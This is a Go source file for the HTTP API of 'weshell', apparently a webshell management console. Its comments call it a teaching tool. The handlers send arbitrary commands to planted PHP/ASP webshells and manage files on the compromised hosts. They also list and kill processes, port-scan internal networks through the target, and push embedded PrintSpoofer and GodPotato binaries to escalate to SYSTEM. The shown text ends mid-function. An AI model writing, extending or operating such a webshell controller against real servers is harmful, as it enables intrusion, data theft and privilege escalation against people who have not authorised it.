// Package api 提供 weshell 管理端的 HTTP 接口。
//
// 接口挂载在 /api 前缀下，以 JSON 交互。每次命令执行都会留下一条审计记录，
// 便于教学复盘与责任追溯。
package api

import (
	"context"
	"crypto/subtle"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/sirupsen/logrus"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"weshell/internal/shell"
	"weshell/internal/store"
)

// maxRequestBytes 限制接口请求体大小。
const maxRequestBytes = 1 << 20 // 1 MiB

// 单台主机端口扫描：改为「单端口单请求 + 并发 + 单请求 35s 预算」，详见 handleScan。
// 这里不再按端口分批，因为 ADO 的 ConnectionTimeout 对被过滤端口不生效，一个慢端口
// 会把整批拖垮；拆成单端口并发后，慢端口只影响自己（故障隔离）。
//
// 内网多主机扫描每批的主机数。多主机走 HostScan（先存活探测再扫端口），单台主机
// 最坏约 23s（探测+完整端口，见各模板超时）。每批 1 台即可保证单次请求 ≤30s；
// 若愿接受更长的单请求，可酌情调大，但密集/全在线网段可能超出 30s 预算。
const scanHostChunk = 1

// chunkStrings 把字符串切片按每 n 个切成多批。n<=0 时退化为每批 1 个。
func chunkStrings(ss []string, n int) [][]string {
	if n <= 0 {
		n = 1
	}
	out := make([][]string, 0, (len(ss)+n-1)/n)
	for i := 0; i < len(ss); i += n {
		end := i + n
		if end > len(ss) {
			end = len(ss)
		}
		out = append(out, ss[i:end])
	}
	return out
}

// probeMark 是新增靶标时用于探测 shell 是否工作的回显标记。
const probeMark = "__weshell_probe__"

// Config 是接口层的运行参数。
type Config struct {
	// Timeout 为单次命令执行的超时时间。
	Timeout time.Duration
	// Token 非空时，接口要求调用方提供匹配的访问令牌。
	Token string
	// LabURL 是本机的默认靶机地址（对应启动参数 -lab）。
	// 只用于前端常驻展示，不参与任何请求。
	LabURL string
	// PrintSpooferEXE 是服务端内嵌的 PrintSpoofer.exe 字节（构建时经 //go:embed 注入），
	// 供 /api/targets/{id}/privesc 自动部署到靶机提权使用。未内嵌时该接口返回明确错误。
	PrintSpooferEXE []byte
	// GodPotatoCppEXE 是服务端内嵌的 C++ 版 GodPotato 字节（tools/godpotato_cpp/godpotato_cpp.exe），
	// 不依赖 .NET，供提权接口自动部署使用。
	GodPotatoCppEXE []byte
	// GodPotatoGoEXE 是服务端内嵌的纯 Go 版 GodPotato 字节（tools/godpotato/godpotato.exe）。
	GodPotatoGoEXE []byte
}

// Server 承载 /api 下的全部路由。
type Server struct {
	store  *store.Store
	logger logrus.FieldLogger
	cfg    Config
	mux    *http.ServeMux
	jars   sync.Map // 按靶机 ID 隔离的 cookie 罐，供会话模块机制跨请求维持靶机会话
}

// New 构造接口服务，返回值可直接挂到 /api/ 前缀下。
func New(logger logrus.FieldLogger, st *store.Store, cfg Config) *Server {
	if cfg.Timeout <= 0 {
		cfg.Timeout = 15 * time.Second
	}
	s := &Server{
		store:  st,
		logger: logger,
		cfg:    cfg,
		mux:    http.NewServeMux(),
	}
	s.mux.HandleFunc("/api/config", s.wrap(s.handleConfig))
	s.mux.HandleFunc("/api/types", s.wrap(s.handleTypes))
	s.mux.HandleFunc("/api/targets", s.wrap(s.handleTargets))
	s.mux.HandleFunc("/api/targets/", s.wrap(s.handleTargetItem))
	// 系统信息：独立注册的专用路由，与 handleTargetItem 的通用子路径分发解耦。
	//   GET /api/sysinfo/{id}     完整系统资源概览
	//   GET /api/sysinfo/{id}/os  轻量：仅操作系统与主机名（选中靶标时快速判定系统类型）
	// 说明：Go 1.21 的 ServeMux 不支持 {id} 通配符（Go 1.22+ 才支持），
	// 因此靶标 ID 放在路径中、用子树模式 "/api/sysinfo/" 匹配后自行解析。
	s.mux.HandleFunc("/api/sysinfo/", s.wrap(s.handleSysInfo))
	// 模块缓存清理：DELETE /api/targets/modules/{id} 清空靶机会话中缓存的模块源码。
	// 用更具体的子树模式覆盖 /api/targets/，避免与 handleTargetItem 冲突。
	s.mux.HandleFunc("/api/targets/modules/", s.wrap(s.handleClearModules))
	s.mux.HandleFunc("/api/settings", s.wrap(s.handleSettings))
	s.mux.HandleFunc("/api/history", s.wrap(s.handleHistory))
	return s
}

func (s *Server) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	s.mux.ServeHTTP(w, r)
}

// wrap 串联令牌校验与请求体大小限制。
func (s *Server) wrap(h http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if !s.authorized(r) {
			writeJSON(w, http.StatusUnauthorized, newError("未提供有效访问令牌"))
			return
		}
		r.Body = http.MaxBytesReader(w, r.Body, maxRequestBytes)
		h(w, r)
	}
}

// authorized 校验调用方令牌。未配置令牌时放行。
func (s *Server) authorized(r *http.Request) bool {
	if s.cfg.Token == "" {
		return true
	}
	got := r.Header.Get("X-Auth-Token")
	if got == "" {
		got = strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
	}
	return subtle.ConstantTimeCompare([]byte(got), []byte(s.cfg.Token)) == 1
}

// ---------- 路由实现 ----------

// handleConfig 返回前端展示所需的运行期配置。
func (s *Server) handleConfig(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 GET"))
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"labUrl":         s.cfg.LabURL,
		"timeoutSeconds": int(s.cfg.Timeout / time.Second),
		"userAgent":      s.store.GetSettings().UserAgent,
	})
}

// handleSettings 处理 /api/settings：GET 读取全局设置，PUT 更新。
// 目前仅含 userAgent：空串=默认标识，"random"=每次随机，其余为固定 UA。
func (s *Server) handleSettings(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		writeJSON(w, http.StatusOK, s.store.GetSettings())
	case http.MethodPut:
		var in struct {
			UserAgent string `json:"userAgent"`
		}
		if !decodeJSON(w, r, &in) {
			return
		}
		if err := s.store.SetSettings(store.GlobalSettings{UserAgent: strings.TrimSpace(in.UserAgent)}); err != nil {
			writeJSON(w, http.StatusInternalServerError, newError(err.Error()))
			return
		}
		s.logger.Infof("更新全局设置 userAgent=%q", in.UserAgent)
		writeJSON(w, http.StatusOK, s.store.GetSettings())
	default:
		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 GET / PUT"))
	}
}

// handleTypes 返回支持的连接类型清单，含靶机侧样本，用于前端下拉框与教学对照。
func (s *Server) handleTypes(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 GET"))
		return
	}
	writeJSON(w, http.StatusOK, shell.Types())
}

// handleTargets 处理集合：GET 列出，POST 新增。
func (s *Server) handleTargets(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		writeJSON(w, http.StatusOK, s.store.List())
	case http.MethodPost:
		var in targetInput
		if !decodeJSON(w, r, &in) {
			return
		}
		t, err := in.normalize()
		if err != nil {
			writeJSON(w, http.StatusBadRequest, newError(err.Error()))
			return
		}

		// 不再强制探测：保存靶标不依赖靶机当前是否可达，录入永远成功。
		// 连通性验证交给列表项的「测试连接」按钮（POST /api/targets/{id}/verify），
		// 由用户主动触发，避免靶机暂时不通时反而无法登记信息。
		t.Verified = false

		created, err := s.store.Add(t)
		if err != nil {
			writeJSON(w, http.StatusInternalServerError, newError(err.Error()))
			return
		}
		s.logger.Infof("新增靶标 %s <%s>", created.Name, created.URL)
		writeJSON(w, http.StatusCreated, created)
	default:
		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 GET / POST"))
	}
}

// handleTargetItem 处理 /api/targets/{id}[/exec]。
func (s *Server) handleTargetItem(w http.ResponseWriter, r *http.Request) {
	rest := strings.Trim(strings.TrimPrefix(r.URL.Path, "/api/targets/"), "/")
	parts := strings.Split(rest, "/")
	id := parts[0]
	if id == "" {
		writeJSON(w, http.StatusBadRequest, newError("缺少靶标 ID"))
		return
	}

	// 文件管理：/api/targets/{id}/fs/{op}
	if len(parts) >= 2 && parts[1] == "fs" {
		s.handleFS(w, r, id, parts[2:])
		return
	}

	// 进程管理：/api/targets/{id}/proc/{list|kill}
	if len(parts) >= 2 && parts[1] == "proc" {
		if len(parts) >= 3 && parts[2] == "kill" {
			s.handleProcKill(w, r, id)
			return
		}
		s.handleProc(w, r, id)
		return
	}

	// 报文探查：/api/targets/{id}/headers（返回请求头 / 响应头，供教学观察真实流量）
	if len(parts) >= 2 && parts[1] == "headers" {
		s.handleHeaders(w, r, id)
		return
	}

	// 监听端口：/api/targets/{id}/ports
	if len(parts) >= 2 && parts[1] == "ports" {
		s.handlePorts(w, r, id)
		return
	}

	// 端口扫描：/api/targets/{id}/scan?host=&ports=
	if len(parts) >= 2 && parts[1] == "scan" {
		s.handleScan(w, r, id)
		return
	}

	// PHP 环境能力研判：/api/targets/{id}/phpinfo
	if len(parts) >= 2 && parts[1] == "phpinfo" {
		s.handlePhpInfo(w, r, id)
		return
	}

	// 测试连接：/api/targets/{id}/verify（主动验证 shell 是否可达且能回显，不阻塞保存）
	if len(parts) >= 2 && parts[1] == "verify" && r.Method == http.MethodPost {
		s.handleVerify(w, r, id)
		return
	}

	// 提权：/api/targets/{id}/privesc（POST；把内嵌 PrintSpoofer.exe 部署到靶机并以 SYSTEM 执行）
	if len(parts) >= 2 && parts[1] == "privesc" && r.Method == http.MethodPost {
		s.handlePrivEsc(w, r, id)
		return
	}

	switch r.Method {
	case http.MethodGet:
		if len(parts) != 1 {
			writeJSON(w, http.StatusNotFound, newError("接口不存在"))
			return
		}
		t, ok := s.store.Get(id)
		if !ok {
			writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
			return
		}
		writeJSON(w, http.StatusOK, t)

	case http.MethodPut:
		if len(parts) != 1 {
			writeJSON(w, http.StatusNotFound, newError("接口不存在"))
			return
		}
		old, ok := s.store.Get(id)
		if !ok {
			writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
			return
		}
		var in targetInput
		if !decodeJSON(w, r, &in) {
			return
		}
		t, err := in.normalize()
		if err != nil {
			writeJSON(w, http.StatusBadRequest, newError(err.Error()))
			return
		}
		// 不再强制探测：URL 变化只重置验证状态，真实连通性由「测试连接」主动验证。
		t.Verified = old.Verified
		t.Os = old.Os
		if t.URL != old.URL {
			t.Verified = false
			t.Os = ""
		}
		updated, err := s.store.Update(id, t)
		if err != nil {
			writeJSON(w, http.StatusNotFound, newError(err.Error()))
			return
		}
		s.logger.Infof("更新靶标 %s <%s>", updated.Name, updated.URL)
		writeJSON(w, http.StatusOK, updated)

	case http.MethodDelete:
		if len(parts) != 1 {
			writeJSON(w, http.StatusNotFound, newError("接口不存在"))
			return
		}
		if err := s.store.Delete(id); err != nil {
			writeJSON(w, http.StatusNotFound, newError(err.Error()))
			return
		}
		s.logger.Infof("删除靶标 %s", id)
		writeJSON(w, http.StatusOK, map[string]string{"deleted": id})

	case http.MethodPost:
		if len(parts) == 2 && parts[1] == "exec" {
			s.execCommand(w, r, id)
			return
		}
		writeJSON(w, http.StatusNotFound, newError("接口不存在"))

	default:
		writeJSON(w, http.StatusMethodNotAllowed, newError("不支持的请求方法"))
	}
}

// execInput 是命令执行的请求体。
type execInput struct {
	Command string `json:"command"`
}

// fsInput 是文件写入/删除操作的请求体。
type fsInput struct {
	Path   string `json:"path"`
	Base64 string `json:"base64"`
}

// handleFS 处理 /api/targets/{id}/fs/{op} 下的文件管理操作。
// op ∈ {list, read, download, write, upload, delete}：
//   - list/read/download 用 GET + path 查询参数
//   - write/upload/delete 用 POST + JSON 体 {path, base64?}
//
// 仅 php-eval / asp 类型靶机支持（php-cmd 无法稳妥地做结构化文件读写）。
func (s *Server) handleFS(w http.ResponseWriter, r *http.Request, id string, sub []string) {
	if len(sub) == 0 || sub[0] == "" {
		writeJSON(w, http.StatusNotFound, newError("文件操作不存在"))
		return
	}
	op := sub[0]
	t, ok := s.store.Get(id)
	if !ok {
		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
		return
	}
	if !shell.SupportsStructured(t.ShellType) {
		writeJSON(w, http.StatusBadRequest, newError("文件管理仅支持 php-eval / asp 类型靶机"))
		return
	}
	o := s.execOpts(t)
	qx := r.URL.Query()

	switch r.Method {
	case http.MethodGet:
		switch op {
		case "list":
			dir := qx.Get("path")
			if dir == "" {
				dir = "."
			}
			entries, resolved, err := shell.FsList(r.Context(), o, dir)
			if err != nil {
				writeJSON(w, http.StatusBadRequest, newError(err.Error()))
				return
			}
			writeJSON(w, http.StatusOK, map[string]any{"path": resolved, "entries": entries})
		case "read", "download":
			path := qx.Get("path")
			if path == "" {
				writeJSON(w, http.StatusBadRequest, newError("缺少 path 参数"))
				return
			}
			f, err := shell.FsRead(r.Context(), o, path)
			if err != nil {
				writeJSON(w, http.StatusBadRequest, newError(err.Error()))
				return
			}
			writeJSON(w, http.StatusOK, f)
		default:
			writeJSON(w, http.StatusMethodNotAllowed, newError("不支持的文件读取操作: "+op))
		}

	case http.MethodPost:
		var in fsInput
		if !decodeJSON(w, r, &in) {
			return
		}
		switch op {
		case "write", "upload":
			if in.Path == "" {
				writeJSON(w, http.StatusBadRequest, newError("缺少 path"))
				return
			}
			if err := shell.FsWrite(r.Context(), o, in.Path, in.Base64); err != nil {
				writeJSON(w, http.StatusBadRequest, newError(err.Error()))
				return
			}
			s.auditFS(id, "write", in.Path, true)
			writeJSON(w, http.StatusOK, map[string]any{"ok": true})
		case "delete":
			if in.Path == "" {
				writeJSON(w, http.StatusBadRequest, newError("缺少 path"))
				return
			}
			if err := shell.FsDelete(r.Context(), o, in.Path); err != nil {
				writeJSON(w, http.StatusBadRequest, newError(err.Error()))
				return
			}
			s.auditFS(id, "delete", in.Path, true)
			writeJSON(w, http.StatusOK, map[string]any{"ok": true})
		default:
			writeJSON(w, http.StatusMethodNotAllowed, newError("不支持的文件写入操作: "+op))
		}

	default:
		writeJSON(w, http.StatusMethodNotAllowed, newError("不支持的请求方法"))
	}
}

// handleSysInfo 处理系统信息相关请求（在 mux 中独立注册，与 handleTargetItem 解耦）：
//
//	GET /api/sysinfo/{id}      完整系统资源概览（CPU/内存/磁盘/进程/网络/公网 IP）
//	GET /api/sysinfo/{id}/os   轻量：仅操作系统与主机名，供选中靶标时快速判定系统类型
//
// 说明：Go 1.21 的 ServeMux 不支持 {id} 通配符（Go 1.22+ 才支持），
// 因此靶标 ID 放在路径中、由本处理器自行解析。
// 仅 php-eval / asp / asp-vbs 类型靶机支持（需要提交 PHP / JScript 采集代码）；
// 其中 /os 轻量接口仅 php-eval 支持（asp 一定是 Windows，调用方可直接判定）。
func (s *Server) handleSysInfo(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 GET"))
		return
	}
	parts := strings.Split(strings.Trim(strings.TrimPrefix(r.URL.Path, "/api/sysinfo/"), "/"), "/")
	id := parts[0]
	if id == "" || strings.ContainsAny(id, "/\\") {
		writeJSON(w, http.StatusBadRequest, newError("缺少靶标 ID"))
		return
	}
	lightOS := len(parts) == 2 && parts[1] == "os"
	if !lightOS && len(parts) != 1 {
		writeJSON(w, http.StatusNotFound, newError("接口不存在"))
		return
	}
	t, ok := s.store.Get(id)
	if !ok {
		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
		return
	}
	// 轻量 /os 接口支持 php-eval / php-cmd / asp / asp-vbs；完整监控仅 php-eval / asp 支持
	//（php-cmd 无 eval 通道，跑不了 /proc + wmic 那套采集代码）。
	if lightOS {
		if !shell.SupportsLightOS(t.ShellType) {
			writeJSON(w, http.StatusBadRequest, newError("系统信息仅支持 php-eval / php-cmd / asp 类型靶机"))
			return
		}
	} else {
		if !shell.SupportsStructured(t.ShellType) {
			writeJSON(w, http.StatusBadRequest, newError("系统监控仅支持 php-eval / asp 类型靶机"))
			return
		}
	}
	o := s.execOpts(t)
	var info map[string]any
	var err error
	if lightOS {
		info, err = shell.OSInfo(r.Context(), o)
	} else {
		info, err = shell.Monitor(r.Context(), o)
	}
	if err != nil {
		writeJSON(w, http.StatusBadRequest, newError(err.Error()))
		return
	}
	writeJSON(w, http.StatusOK, info)
}

// handleProc 处理 /api/targets/{id}/proc/list：读取靶机进程列表（含 PPID）。
// 仅 php-eval / asp 类型靶机支持（需要提交 PHP / JScript 采集代码）。
func (s *Server) handleProc(w http.ResponseWriter, r *http.Request, id string) {
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 GET"))
		return
	}
	t, ok := s.store.Get(id)
	if !ok {
		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
		return
	}
	if !shell.SupportsStructured(t.ShellType) {
		writeJSON(w, http.StatusBadRequest, newError("进程管理仅支持 php-eval / asp 类型靶机"))
		return
	}
	o := s.execOpts(t)
	info, err := shell.ProcList(r.Context(), o)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, newError(err.Error()))
		return
	}
	writeJSON(w, http.StatusOK, info)
}

// handleProcKill 处理 /api/targets/{id}/proc/kill：向靶机进程发送信号结束它。
// php-eval 走 posix_kill / kill，asp 走 taskkill；POST 入参 {pid, signal}，signal 缺省为 15 (SIGTERM)。
func (s *Server) handleProcKill(w http.ResponseWriter, r *http.Request, id string) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 POST"))
		return
	}
	t, ok := s.store.Get(id)
	if !ok {
		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
		return
	}
	if !shell.SupportsStructured(t.ShellType) {
		writeJSON(w, http.StatusBadRequest, newError("进程管理仅支持 php-eval / asp 类型靶机"))
		return
	}
	var in struct {
		PID    string `json:"pid"`
		Signal int    `json:"signal"`
	}
	if !decodeJSON(w, r, &in) {
		return
	}
	if in.PID == "" {
		writeJSON(w, http.StatusBadRequest, newError("缺少 pid"))
		return
	}
	sig := in.Signal
	if sig == 0 {
		sig = 15
	}
	o := s.execOpts(t)
	res, err := shell.ProcKill(r.Context(), o, in.PID, sig)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, newError(err.Error()))
		return
	}
	ok2, _ := res["ok"].(bool)
	s.store.TouchLastUsed(id)
	s.store.AppendRecord(store.CommandRecord{
		TargetID: id,
		Command:  "proc:kill " + in.PID + " sig " + strconv.Itoa(sig),
		OK:       ok2,
	})
	writeJSON(w, http.StatusOK, res)
}

// handlePorts 处理 /api/targets/{id}/ports：读取靶机监听端口列表（含 PID/进程名）。
// 仅 php-eval / asp 类型靶机支持（需要提交 PHP / JScript 采集代码）。
func (s *Server) handlePorts(w http.ResponseWriter, r *http.Request, id string) {
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 GET"))
		return
	}
	t, ok := s.store.Get(id)
	if !ok {
		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
		return
	}
	if !shell.SupportsStructured(t.ShellType) {
		writeJSON(w, http.StatusBadRequest, newError("端口监听仅支持 php-eval / asp 类型靶机"))
		return
	}
	o := s.execOpts(t)
	info, err := shell.PortsList(r.Context(), o)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, newError(err.Error()))
		return
	}
	writeJSON(w, http.StatusOK, info)
}

// handleScan 处理 /api/targets/{id}/scan?host=&ports=：对目标主机做 TCP 端口扫描。
// 仅 php-eval / asp 类型靶机支持（依赖靶机侧 fsockopen / WinHttpRequest）。
// host 为目标地址（IP 或域名），ports 为端口规格（如 "80"、"1-1000"、"21,22,80,443"），
// 缺省时扫描一组常见端口。
func (s *Server) handleScan(w http.ResponseWriter, r *http.Request, id string) {
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 GET"))
		return
	}
	t, ok := s.store.Get(id)
	if !ok {
		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
		return
	}
	if !shell.SupportsStructured(t.ShellType) {
		writeJSON(w, http.StatusBadRequest, newError("端口扫描仅支持 php-eval / asp 类型靶机"))
		return
	}
	host := strings.TrimSpace(r.URL.Query().Get("host"))
	if host == "" {
		writeJSON(w, http.StatusBadRequest, newError("缺少目标主机 host 参数"))
		return
	}
	ports := strings.TrimSpace(r.URL.Query().Get("ports"))
	if ports == "" {
		ports = "21,22,23,25,53,80,110,135,139,143,443,445,3306,3389,8080"
	}
	hosts, err := shell.ExpandHosts(host)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, newError(err.Error()))
		return
	}
	o := s.execOpts(t)
	if len(hosts) == 1 {
		// 单台主机：逐个端口下发靶机扫描，并发执行并合并结果。
		//
		// 改为「单端口单请求」而不是按端口分批下发，是为了故障隔离：
		// 某个被过滤/不可达的端口在靶机侧会挂到 OS 级 TCP 超时（约 21s，ADO 的
		// ConnectionTimeout=2s 对它不生效）。若整批下发，一个慢端口就会拖垮整批的
		// Go 侧预算（原先 5 端口 ×3.5s+10s=27.5s，小于靶机模板自带的 30s 预算，于是
		// Go 先取消，整批报 context deadline exceeded）。拆成单端口并发后，慢端口只
		// 影响自己，开放端口照常秒回。
		//
		// 单请求预算提到 35s（略高于靶机模板内部 30s 预算），保证即便某端口被过滤、
		// 要等 OS 超时，靶机也能在 Go 取消前返回「关闭」，而非被 Go 掐成 deadline exceeded。
		expanded, err := shell.ExpandPorts(ports)
		if err != nil {
			writeJSON(w, http.StatusBadRequest, newError(err.Error()))
			return
		}
		portList := strings.Split(expanded, ",")
		// 并发上限：避免大端口列表一次性打出几千个并发请求把靶机/网络打爆。
		const maxConcurrency = 64
		sem := make(chan struct{}, maxConcurrency)
		type portOutcome struct {
			entries []any
			elapsed float64
			err     error
			method  string
			diag    string
		}
		outcomes := make([]portOutcome, len(portList))
		var wg sync.WaitGroup
		for i, p := range portList {
			wg.Add(1)
			sem <- struct{}{}
			go func(i int, p string) {
				defer wg.Done()
				defer func() { <-sem }()
				// 每个端口独立 context 与超时，互不影响（故障隔离）。
				cctx, cancel := context.WithTimeout(r.Context(), 35*time.Second)
				defer cancel()
				opt := o
				opt.Timeout = 35 * time.Second
				info, err := shell.PortScan(cctx, opt, hosts[0], p)
				if err != nil {
					outcomes[i].err = err
					return
				}
				if ok, _ := info["ok"].(bool); !ok {
					if e, _ := info["error"].(string); e != "" {
						outcomes[i].err = errors.New(e)
					} else {
						outcomes[i].err = fmt.Errorf("靶机返回非成功状态（HTTP %v）", info["status"])
					}
					return
				}
				if ps, ok := info["ports"].([]any); ok {
					outcomes[i].entries = ps
				}
				if e, ok := info["elapsed"].(float64); ok {
					outcomes[i].elapsed = e
				}
				if m, ok := info["method"].(string); ok && m != "" {
					outcomes[i].method = m
				}
				if n, ok := info["note"].(string); ok && n != "" {
					outcomes[i].diag = n
				}
				if d, ok := info["pwshDiag"].(string); ok && d != "" {
					if outcomes[i].diag != "" {
						outcomes[i].diag += " | "
					}
					outcomes[i].diag += d
				}
			}(i, p)
		}
		wg.Wait()

		merged := make([]any, 0, len(portList))
		var totalElapsed float64
		var errs []string
		for i, p := range portList {
			if outcomes[i].err != nil {
				// 单端口失败只记一笔，不拖垮整批（故障隔离）。
				errs = append(errs, fmt.Sprintf("端口 %s: %v", p, outcomes[i].err))
				continue
			}
			merged = append(merged, outcomes[i].entries...)
			totalElapsed += outcomes[i].elapsed
		}
		// 按端口号升序，输出稳定、便于前端展示。
		sort.Slice(merged, func(a, b int) bool {
			pa, _ := merged[a].(map[string]any)["port"].(float64)
			pb, _ := merged[b].(map[string]any)["port"].(float64)
			return pa < pb
		})
		if len(merged) == 0 {
			if len(errs) > 0 {
				writeJSON(w, http.StatusBadRequest, newError(strings.Join(errs, "; ")))
				return
			}
			// 所有端口均探测成功但未回传任何端口条目：通常是靶机对应端口全部关闭/过滤，
			// 或靶机响应未夹带 ports 字段。这属于正常结果，应返回成功态（空列表），
			// 而非 HTTP 400 + 空错误，否则前端会误报「请求失败（HTTP 400）」。
			writeJSON(w, http.StatusOK, map[string]any{
				"ok":      true,
				"host":    hosts[0],
				"ports":   []any{},
				"elapsed": totalElapsed,
				"note":    "未探测到开放端口",
			})
			return
		}
		resp := map[string]any{
			"ok":      true,
			"host":    hosts[0],
			"ports":   merged,
			"elapsed": totalElapsed,
		}
		// 取最后一个带 method 的批次，向前端透出本次实际使用的探测方式（便于排查靶机环境差异）。
		for i := len(outcomes) - 1; i >= 0; i-- {
			if outcomes[i].method != "" {
				resp["method"] = outcomes[i].method
				if outcomes[i].diag != "" {
					resp["diag"] = outcomes[i].diag
				}
				break
			}
		}
		if len(errs) > 0 {
			resp["errors"] = errs
		}
		writeJSON(w, http.StatusOK, resp)
		return
	}
	// 多台主机：按 scanHostChunk 分小批，每批在靶机上完成「存活探测 + 端口扫描」后返回并合并。
	// 分小批是为了让每次 weshell→靶机请求耗时尽量 ≤30s（单台主机最坏约 23s），
	// 避免一次性全量请求被靶机脚本超时（ASP≈90s / PHP=30s）或自身 30s 预算掐断。
	probeCount := len(strings.Split(shell.ScanProbePorts, ","))
	portCount := len(strings.Split(ports, ","))
	perHost := time.Duration(probeCount)*600*time.Millisecond + time.Duration(portCount)*1200*time.Millisecond
	chunks := chunkStrings(hosts, scanHostChunk)
	mergedHosts := make([]any, 0, len(hosts))
	var totalElapsed float64
	for _, ch := range chunks {
		cto := perHost*time.Duration(len(ch)) + 20*time.Second
		if cto > 30*time.Minute {
			cto = 30 * time.Minute
		}
		if cto < o.Timeout {
			cto = o.Timeout
		}
		o.Timeout = cto
		info, err := shell.HostScan(r.Context(), o, ch, ports, shell.ScanProbePorts)
		if err != nil {
			writeJSON(w, http.StatusBadRequest, newError(err.Error()))
			return
		}
		if ok, _ := info["ok"].(bool); !ok {
			writeJSON(w, http.StatusBadRequest, newError(fmt.Sprintf("%v", info["error"])))
			return
		}
		if hs, ok := info["hosts"].([]any); ok {
			mergedHosts = append(mergedHosts, hs...)
		}
		if e, ok := info["elapsed"].(float64); ok {
			totalElapsed += e
		}
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"ok":      true,
		"hosts":   mergedHosts,
		"elapsed": totalElapsed,
	})
}

// php-eval 返回 PHP 环境信息（版本 / 禁用函数 / open_basedir 等）；
// asp 返回 ASP 环境信息（脚本引擎 / 关键 COM 组件可用性等）。两者均仅各自类型支持。
func (s *Server) handlePhpInfo(w http.ResponseWriter, r *http.Request, id string) {
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 GET"))
		return
	}
	t, ok := s.store.Get(id)
	if !ok {
		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
		return
	}
	if !shell.SupportsStructured(t.ShellType) {
		writeJSON(w, http.StatusBadRequest, newError("环境能力仅支持 php-eval / asp 类型靶机"))
		return
	}
	o := s.execOpts(t)
	var info map[string]any
	var err error
	if t.ShellType == shell.TypeAsp || t.ShellType == shell.TypeAspVbs {
		info, err = shell.AspEnv(r.Context(), o)
	} else if t.ShellType == shell.TypeAspnet {
		info, err = shell.AspNetEnv(r.Context(), o)
	} else {
		info, err = shell.PhpInfo(r.Context(), o)
	}
	if err != nil {
		writeJSON(w, http.StatusBadRequest, newError(err.Error()))
		return
	}
	writeJSON(w, http.StatusOK, info)
}

// handleHeaders 处理 /api/targets/{id}/headers：向靶标发一次探测请求，
// 返回管理端实际构造的请求头与靶机返回的响应头。三种连接类型通用，不依赖靶机侧脚本能力。
func (s *Server) handleHeaders(w http.ResponseWriter, r *http.Request, id string) {
	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 GET"))
		return
	}
	t, ok := s.store.Get(id)
	if !ok {
		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
		return
	}
	o := s.execOpts(t)
	res := shell.Inspect(r.Context(), o)
	s.store.TouchLastUsed(id)
	writeJSON(w, http.StatusOK, res)
}

// handleVerify 处理 /api/targets/{id}/verify：主动验证 shell 是否可达且能正常回显。
// 与保存解耦——保存永远成功，连通性验证由用户点「测试连接」触发，结果持久化到靶标上。
func (s *Server) handleVerify(w http.ResponseWriter, r *http.Request, id string) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 POST"))
		return
	}
	t, ok := s.store.Get(id)
	if !ok {
		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
		return
	}
	probe := shell.Execute(r.Context(), s.execOpts(t).WithCommand("echo "+probeMark))
	verified := probe.OK && strings.Contains(probe.Output, probeMark)

	// 持久化验证结果，便于列表展示是否已验证、以及教学时区分「登记了但没连上」。
	t.Verified = verified
	// 连通即顺带实测操作系统类型（lightweight），写回靶标，保证列表直接显示正确系统图标；
	// 非 php/asp 类型或探测失败均不阻塞验证，Os 留空由前端按引擎类型猜测。
	if verified {
		if os := detectOS(r.Context(), s, t); os != "" {
			t.Os = os
		}
	}
	if _, err := s.store.Update(id, t); err != nil {
		s.logger.Infof("更新靶标 %s 验证状态失败: %v", id, err)
	}
	s.store.TouchLastUsed(id)

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"ok":        probe.OK,
		"verified":  verified,
		"status":    probe.Status,
		"latencyMs": probe.LatencyMS,
		"error":     probe.Error,
		"output":    probe.Output,
		"os":        t.Os,
	})
}

// detectOS 在验证通过后顺带实测靶机操作系统类型，返回归一化标识
//（'windows'/'linux'/'mac'）；不支持或探测失败返回空串（不阻塞验证）。
func detectOS(ctx context.Context, s *Server, t store.Target) string {
	// ASP/ASP-VBS 必跑在 IIS/Windows 上，无需探测即可判定。
	if t.ShellType == "asp" || t.ShellType == "asp-vbs" || t.ShellType == "aspnet" {
		return "windows"
	}
	// php-eval / php-cmd 均由 shell.OSInfo 返回归一化后的 os 标识。
	info, err := shell.OSInfo(ctx, s.execOpts(t))
	if err != nil {
		return ""
	}
